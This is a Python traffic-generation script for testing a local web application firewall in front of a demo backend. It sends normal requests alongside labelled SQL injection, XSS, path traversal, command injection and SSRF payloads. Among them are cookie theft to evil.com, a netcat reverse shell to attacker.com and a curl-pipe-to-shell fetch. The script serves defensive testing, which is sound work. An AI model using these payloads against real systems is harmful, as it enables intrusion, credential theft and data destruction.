# test_traffic.py — run from project root
#
# Sends 100+ varied requests through the live WAF (port 8000) to the
# protected demo backend (dummy_app.py, port 5000). No /proxy prefix —
# the middleware forwards path + query 1:1, except its own bypassed
# routes (see bypass_paths in app/middleware/waf_middleware.py).
#
# NOTE: as of this script, app/main.py registers `limiter` and a
# RateLimitExceeded handler but never actually adds SlowAPIMiddleware
# or a per-route @limiter.limit(...) decorator — so RATE_LIMIT_PER_MIN
# isn't currently enforced anywhere, and you likely won't see 429s no
# matter how fast you send requests. The delay + retry below are kept
# anyway: harmless if the limiter stays unwired, and correct once it's
# actually turned on.
import time
import requests

BASE = "http://127.0.0.1:8000"
DELAY_SEC = 0.6          # ~100/min-safe spacing if/when rate limiting is enforced
MAX_RETRIES = 3


def send(method, path, **kwargs):
    for attempt in range(MAX_RETRIES):
        r = requests.request(method, BASE + path, timeout=10, **kwargs)
        if r.status_code == 429:
            wait = float(r.headers.get("Retry-After", 2))
            print(f"  429 rate-limited on {path[:60]} — backing off {wait}s")
            time.sleep(wait)
            continue
        return r
    return r  # give up after MAX_RETRIES, return last response anyway


# ============================================================
# NORMAL — ordinary use of every route (score < 30, expect allow)
# ============================================================
normal = [
    ("GET",  "/api/products"),
    ("GET",  "/api/products?category=electronics"),
    ("GET",  "/api/products?category=electronics&page=2&limit=5"),
    ("GET",  "/api/products/search?q=laptop"),
    ("GET",  "/api/products/search?q=wireless+mouse"),
    ("GET",  "/api/products/search?q=headphones"),
    ("GET",  "/api/products/101"),
    ("GET",  "/api/products/102"),
    ("GET",  "/api/users/profile?user_id=1"),
    ("GET",  "/api/users/profile?user_id=42"),
    ("GET",  "/api/orders"),
    ("GET",  "/api/orders?user_id=1&status=delivered"),
    ("GET",  "/api/orders/details?order_id=5001"),
    ("GET",  "/api/cart"),
    ("GET",  "/api/cart?user_id=7"),
    ("GET",  "/api/reviews"),
    ("GET",  "/api/reviews?product_id=101&sort=recent"),
    ("GET",  "/api/reviews?product_id=102&sort=top"),
    ("GET",  "/api/contact?subject=Question&message=When+will+my+order+ship"),
    ("GET",  "/api/contact?subject=Feedback&message=Great+service+thanks"),
    ("GET",  "/api/files/view?path=readme.txt"),
    ("GET",  "/api/files/download?file=invoice.pdf"),
    ("GET",  "/api/system/check?value=status"),
    ("GET",  "/api/admin/dashboard"),
    ("GET",  "/api/admin/users?search=john&page=1"),
    ("GET",  "/hello"),
    ("GET",  "/"),
    ("POST", "/api/users/login", {"params": {"username": "john", "password": "hello123"}}),
    ("POST", "/api/users/login", {"params": {"username": "maria", "password": "correcthorsebattery"}}),
    ("GET",  "/api/products?category=books&page=1&limit=20"),
    ("GET",  "/api/products/search?q=coffee+maker"),
    ("GET",  "/api/products/search?q=run"),
]

# ============================================================
# SQLi — classic + blind + UNION-based injection patterns
# (expect: high anomaly score, Layer 2B class = sqli, likely block)
# ============================================================
sqli = [
    ("GET",  "/api/products/search?q=laptop' OR '1'='1"),
    ("GET",  "/api/products/search?q=' UNION SELECT username,password FROM users--"),
    ("GET",  "/api/products/101 OR 1=1"),
    ("GET",  "/api/users/profile?user_id=1' OR '1'='1' --"),
    ("GET",  "/api/orders/details?order_id=5001; DROP TABLE orders;--"),
    ("GET",  "/api/reviews?product_id=101 UNION SELECT NULL,NULL,NULL--"),
    ("POST", "/api/users/login", {"params": {"username": "admin'--", "password": "x"}}),
    ("POST", "/api/users/login", {"params": {"username": "' OR 1=1#", "password": "anything"}}),
    ("GET",  "/api/admin/users?search=' OR 'a'='a"),
    ("GET",  "/api/products?category=electronics' AND SLEEP(5)--"),
    ("GET",  "/api/products/search?q=1' AND (SELECT COUNT(*) FROM users)>0--"),
    ("GET",  "/api/orders?user_id=1' UNION SELECT credit_card FROM payments--"),
]

# ============================================================
# XSS — reflected script / event-handler / encoded payloads
# (expect: high anomaly score, Layer 2B class = xss, likely block)
# ============================================================
xss = [
    ("GET",  "/api/products/search?q=<script>alert(1)</script>"),
    ("GET",  "/api/contact?subject=<img src=x onerror=alert('xss')>&message=hi"),
    ("GET",  "/api/reviews?product_id=101&sort=<svg onload=alert(document.cookie)>"),
    ("GET",  "/api/products?category=<script>fetch('//evil.com?c='+document.cookie)</script>"),
    ("GET",  "/api/contact?subject=test&message=<iframe src=javascript:alert(1)>"),
    ("GET",  "/api/products/search?q=%3Cscript%3Ealert(String.fromCharCode(88,83,83))%3C/script%3E"),
    ("GET",  "/api/admin/users?search=<body onload=alert('pwned')>"),
    ("GET",  "/api/users/profile?user_id=<script>document.location='http://evil.com'</script>"),
    ("GET",  "/api/reviews?product_id=<img src=x onerror=this.src='http://evil.com/'+document.cookie>"),
    ("GET",  "/api/products/search?q=\"><script>alert(1)</script>"),
]

# ============================================================
# LFI — path traversal / local file inclusion attempts
# (expect: elevated score; per CRC this class is historically the
# hardest for the pipeline — block rate 45.41% at the locked config,
# so some of these may legitimately be allowed/logged, not blocked)
# ============================================================
lfi = [
    ("GET",  "/api/files/view?path=../../../../etc/passwd"),
    ("GET",  "/api/files/view?path=..%2f..%2f..%2fetc%2fpasswd"),
    ("GET",  "/api/files/download?file=../../../../windows/win.ini"),
    ("GET",  "/api/files/view?path=....//....//....//etc/shadow"),
    ("GET",  "/api/files/view?path=/etc/passwd%00.txt"),
    ("GET",  "/api/files/view?path=..\\..\\..\\..\\boot.ini"),
    ("GET",  "/api/files/download?file=php://filter/convert.base64-encode/resource=index.php"),
    ("GET",  "/api/files/view?path=..%252f..%252f..%252fetc%252fpasswd"),
    ("GET",  "/api/files/view?path=file:///etc/passwd"),
    ("GET",  "/api/files/download?file=....\\\\....\\\\....\\\\etc\\\\passwd"),
]

# ============================================================
# OTHER_ATTACK (CMDi folded in per CRC's 5-class taxonomy) —
# OS command injection + a couple of modern-attack-probe-style
# payloads (SSRF / GraphQL-ish), for demo variety
# (expect: elevated score, Layer 2B class = other_attack)
# ============================================================
other_attack = [
    ("GET",  "/api/system/check?value=status; cat /etc/passwd"),
    ("GET",  "/api/system/check?value=status && whoami"),
    ("GET",  "/api/system/check?value=status | nc attacker.com 4444 -e /bin/sh"),
    ("GET",  "/api/system/check?value=status`id`"),
    ("GET",  "/api/system/check?value=status$(curl http://evil.com/shell.sh|sh)"),
    ("GET",  "/api/products?category=electronics&callback=http://169.254.169.254/latest/meta-data/"),
    ("GET",  "/api/contact?subject=test&message=;ping -c 10 127.0.0.1;"),
    ("POST", "/api/users/login", {"params": {"username": "admin", "password": "x' ; DROP TABLE users; --"}}),
]


CATEGORIES = [
    ("NORMAL",       normal,       "expect mostly ALLOW"),
    ("SQLi",         sqli,         "expect mostly BLOCK"),
    ("XSS",          xss,          "expect mostly BLOCK"),
    ("LFI",          lfi,          "expect mixed ALLOW/LOG/BLOCK — known weak class"),
    ("OTHER_ATTACK", other_attack, "expect mixed LOG/BLOCK — CMDi + probe-style payloads"),
]


def run_category(name, requests_list, note):
    print(f"\n{'=' * 70}")
    print(f"  {name}  ({len(requests_list)} requests) — {note}")
    print(f"{'=' * 70}")

    tally = {}
    for item in requests_list:
        method, path = item[0], item[1]
        kwargs = item[2] if len(item) > 2 else {}

        try:
            r = send(method, path, **kwargs)
            status = r.status_code
            # Best-effort read of WAF decision/score if the middleware
            # exposes them as response headers — adjust header names to
            # match app/middleware/waf_middleware.py if different.
            decision = r.headers.get("X-WAF-Decision", "?")
            score = r.headers.get("X-WAF-Score", "?")
            print(f"[{status}] decision={decision:<6} score={score:<8} {method} {path[:70]}")
            tally[decision] = tally.get(decision, 0) + 1
        except requests.exceptions.RequestException as e:
            print(f"[ERR] {method} {path[:70]} -> {e}")
            tally["ERROR"] = tally.get("ERROR", 0) + 1

        time.sleep(DELAY_SEC)

    print(f"  -- {name} summary: {tally}")
    return tally


def main():
    print(f"Sending traffic to WAF at {BASE} ...")
    overall = {}
    for name, reqs, note in CATEGORIES:
        tally = run_category(name, reqs, note)
        for k, v in tally.items():
            overall[k] = overall.get(k, 0) + v

    total = sum(overall.values())
    print(f"\n{'=' * 70}")
    print(f"  OVERALL ({total} requests across {len(CATEGORIES)} categories)")
    print(f"{'=' * 70}")
    for decision, count in sorted(overall.items(), key=lambda kv: -kv[1]):
        pct = 100 * count / total if total else 0
        print(f"  {decision:<10} {count:>4}  ({pct:5.1f}%)")


if __name__ == "__main__":
    main()